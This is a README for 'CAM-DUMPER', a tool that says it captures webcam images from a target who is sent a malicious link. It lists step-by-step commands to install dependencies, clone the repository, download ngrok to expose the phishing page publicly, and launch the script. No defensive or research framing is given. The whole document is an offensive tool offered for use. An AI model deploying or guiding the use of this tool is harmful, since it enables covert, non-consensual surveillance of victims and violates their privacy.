<h1 align="center">CAM-DUMPER</h1>
<p align="center"><img src="cd.jpg" max-width="90%%" height="auto"></p>
<p align="center">Take webcam shots from target by just sending a malicious link</p>


## NAsıl Yüklenir? (Kali Linux/Termux):


```
apt update && apt upgrade
```
```
apt install git
```
```
apt install php wget curl jq
```
```
git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
```
```
cd CAM-DUMPER
```
```
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip && unzip *.zip && rm *.zip
```
```
chmod +x camdumper.sh ngrok
```
```
echo "web_addr: 4045" >> $HOME/.ngrok2/ngrok.yml
```
```
./camdumper.sh
```
• if $HOME/.ngrok2/ngrok.yml doesnt exist then
you must create it by running-
```
mkdir $HOME/.ngrok2 && touch $HOME/.ngrok2/ngrok.yml
```
